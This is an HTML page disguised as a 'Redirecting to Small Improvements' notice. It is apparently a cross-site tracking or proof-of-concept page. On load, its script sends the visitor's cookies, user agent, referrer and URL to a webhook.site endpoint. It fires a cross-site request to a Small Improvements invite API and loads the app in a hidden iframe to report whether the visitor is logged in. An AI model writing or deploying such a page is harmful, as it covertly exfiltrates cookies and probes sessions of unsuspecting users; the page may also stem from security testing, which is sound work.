<!DOCTYPE html>
<html>
<head>
    <title>Redirecting to Small Improvements...</title>
    <meta http-equiv="refresh" content="2;url=https://app.small-improvements.com/app/home">
</head>
<body>
    <h2>Redirecting to Small Improvements...</h2>
    <p>Please wait while we take you to your dashboard.</p>

    <script>
        // Create a hidden iframe that loads Small Improvements
        function createTracker() {
            // Method 1: Image pixel that includes JSESSIONID in URL
            const img = new Image();
            
            // This will capture when the image fails to load (due to auth)
            img.onerror = function() {
                // Send the failed request info to webhook
                fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'IMAGE_TRACKER_TRIGGERED',
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        referrer: document.referrer,
                        message: 'Tracker image attempted to load from Small Improvements domain'
                    })
                });
            };
            
            // Try to load an image from Small Improvements - this will include THEIR cookies!
            img.src = 'https://app.small-improvements.com/api/v2/users/invite?tracker=' + 
                     Date.now() + '&ref=' + encodeURIComponent(document.referrer);
        }

        // Method 2: Create iframe and detect navigation
        function createHiddenIframe() {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'https://app.small-improvements.com/app/home';
            
            iframe.onload = function() {
                // If iframe loads successfully, they're logged in
                fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'IFRAME_LOADED_SUCCESS',
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        message: 'User has active Small Improvements session'
                    })
                });
            };
            
            document.body.appendChild(iframe);
        }

        // Execute both methods
        setTimeout(createTracker, 500);
        setTimeout(createHiddenIframe, 1000);

        // Send initial visit data
        fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                type: 'INITIAL_VISIT',
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                referrer: document.referrer,
                url: window.location.href,
                cookies: document.cookie,
                message: 'User landed on tracker page'
            })
        });

    </script>
</body>
</html>
